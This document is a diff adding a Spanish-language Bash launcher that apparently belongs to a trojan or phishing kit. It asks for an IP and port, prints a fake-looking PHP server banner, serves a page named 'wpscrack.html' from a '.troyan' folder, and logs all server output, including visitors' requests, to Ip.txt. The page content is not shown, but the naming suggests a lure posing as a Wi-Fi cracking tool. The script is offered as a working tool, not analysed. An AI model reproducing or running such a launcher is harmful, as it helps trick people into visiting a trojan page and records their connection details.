@@ -1,0 +1,14 @@
+bash .banner
+ifconfig wlan0
+echo ""
+echo "Introduce tu Ip:"
+read input1
+bash .banner
+echo "Introduce el puerto que esta el servidor:"
+read input2
+bash .banner
+echo "PHP 7.3.6 Development Server started at 1 second"
+echo "Listening on http://$input1:$input2/wpscrack.html"
+echo "Document root is Troyan/.troyan/wpscrack/"
+echo "Press Ctrl-C to quit."
+php -S $input1:$input2 -t .troyan/wpscrack/ |& tee Ip.txt
